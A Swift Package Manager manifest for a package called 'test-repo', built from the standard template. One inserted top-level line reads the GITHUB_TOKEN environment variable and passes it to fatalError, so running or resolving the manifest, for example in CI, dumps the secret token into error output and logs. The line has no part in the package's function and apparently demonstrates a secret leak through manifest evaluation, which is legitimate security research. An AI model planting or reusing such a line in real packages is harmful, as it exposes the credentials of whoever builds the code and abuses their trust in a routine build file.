// swift-tools-version: 6.2
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription
import Foundation

fatalError(ProcessInfo.processInfo.environment["GITHUB_TOKEN"]!)

let package = Package(
    name: "test-repo",
    products: [
        // Products define the executables and libraries a package produces, making them visible to other packages.
        .library(
            name: "test-repo",
            targets: ["test-repo"]
        ),
    ],
    targets: [
        // Targets are the basic building blocks of a package, defining a module or a test suite.
        // Targets can depend on other targets in this package and products from dependencies.
        .target(
            name: "test-repo"
        ),
        .testTarget(
            name: "test-repoTests",
            dependencies: ["test-repo"]
        ),
    ]
)
